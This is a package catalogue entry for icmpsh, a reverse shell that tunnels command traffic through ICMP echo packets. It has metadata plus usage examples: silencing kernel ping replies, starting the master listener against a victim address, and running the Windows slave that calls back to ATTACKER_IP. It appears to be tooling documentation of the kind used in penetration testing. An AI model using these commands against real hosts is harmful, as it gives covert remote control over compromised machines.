---
name: "icmpsh"
categories:
  - blackarch-backdoor
version: "12.82caf34"
homepage: "https://github.com/inquisb/icmpsh"
packaged-by: [blackarch]
blackarch-builddate: "2025-07-18"
build-system: perl
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "inquisb/icmpsh"
github-stars: 1631
github-pushed: "2018-04-06"
github-archived: false
github-issues: 10
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.2
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# icmpsh

> Reverse shell that tunnels command traffic inside ICMP echo requests, for targets where TCP/UDP egress is filtered but ping flows.

## What it's for

icmpsh gets a shell out of a network where firewalls allow only ICMP (e.g., after a DMZ breakout with strict egress ACLs). A Windows-only slave (`icmpsh.exe`, written in C) hides the C2 channel in ordinary ping requests, while the master runs on the attacker's POSIX machine in C (`icmpsh-m`), Perl (`icmpsh-m.pl`) or Python (`icmpsh_m.py`) — the original C/Perl masters are by Nico Leidecker, the Python port by Bernardo Damele (the GitHub repo now lives under `bdamele/icmpsh`, redirecting from `inquisb/icmpsh`). Its distinguishing feature: the slave needs no administrator privileges on the target. It is a plain command pipe over echo request/reply pairs — no built-in encryption or authentication — and traffic is plaintext inside the ICMP payload, so anything that inspects ICMP can read it.

*No corpus evidence — derived from upstream documentation.*

## Typical use cases

### Stop the master host's kernel from answering pings

The OS would race the master to answer the slave's echo requests; silence it first or the slave will never see your commands.

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

Outcome: the Linux kernel stops replying to ICMP echo requests until reboot (restore with value `0`), leaving the master's raw-socket listener as the only responder; run the master as root since it needs raw sockets.

### Start the master and wait for the slave

Open the operator-side listener bound to your IP, expecting the victim at a known address.

```
python icmpsh_m.py ATTACKER_IP 198.51.100.10
```

Outcome: the Python master sniffs ICMP echo traffic between your IP and 198.51.100.10; once the slave checks in you get an interactive prompt whose input is delivered inside echo replies.

### Run the slave on the Windows target

Start the client on the compromised host without needing admin rights.

```
icmpsh.exe -t ATTACKER_IP -d 500 -b 30 -s 128
```

Outcome: the slave begins pinging ATTACKER_IP every 500 ms (`-d`), quits after 30 unanswered requests (`-b`), and carries up to 128 bytes per packet (`-s`); commands typed at the master execute on the Windows box and their output returns inside the echo requests.

### Probe the channel with a single test packet

Verify ICMP connectivity before committing to a session.

```
icmpsh.exe -t ATTACKER_IP -r
```

Outcome: the slave sends exactly one echo request containing the string `Test1234` and exits; seeing it arrive at the master (e.g., in a simultaneous tcpdump/icmpdump) confirms the path works end to end.
